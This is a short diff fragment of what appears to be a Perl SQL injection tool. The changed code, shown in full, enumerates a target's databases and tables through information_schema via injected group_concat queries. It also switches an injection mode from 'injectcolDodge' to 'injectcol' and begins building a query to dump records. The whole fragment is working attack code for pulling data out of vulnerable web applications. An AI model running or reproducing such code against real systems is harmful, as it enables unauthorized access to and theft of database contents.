@@ -39,15 +39,13 @@ if($res =~ /positive/i){
     print "\n------\n";
     print "Database: " . SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", 'group_concat(database())'));
     print "\n------\n";
-    my @databases = split(",",SQLData::parsePage(SQLData::fetchPage($injString, "injectcolDodge", "(select group_concat(distinct table_schema SEPARATOR ',') from information_schema.tables)")));
-
+    my @databases = split(",",SQLData::parsePage(SQLData::fetchPage($injString, "injectcol", "(select group_concat(distinct table_schema SEPARATOR ',') from information_schema.tables)")));
     foreach my $db(@databases){
         next if $db =~ /phpmyadmin/;
         print "Accessible DB: ", $db, "\n";
-        print "Accessible Table: ", $_, "\n" foreach(split(",",SQLData::parsePage(SQLData::fetchPage($injString, "injectcolDodge",
+        print "Accessible Table: ", $_, "\n" foreach(split(",",SQLData::parsePage(SQLData::fetchPage($injString, "injectcol",
         "(select group_concat(distinct table_name SEPARATOR ',') from information_schema.tables where table_schema = " . "'$db')"))));
         print "[--------------]\n";
-        
     }
     my $queryRecSTR = "(select "
                 ."-COL- from (select \@r:=\@r%2b1 as gid,-COL- from ("
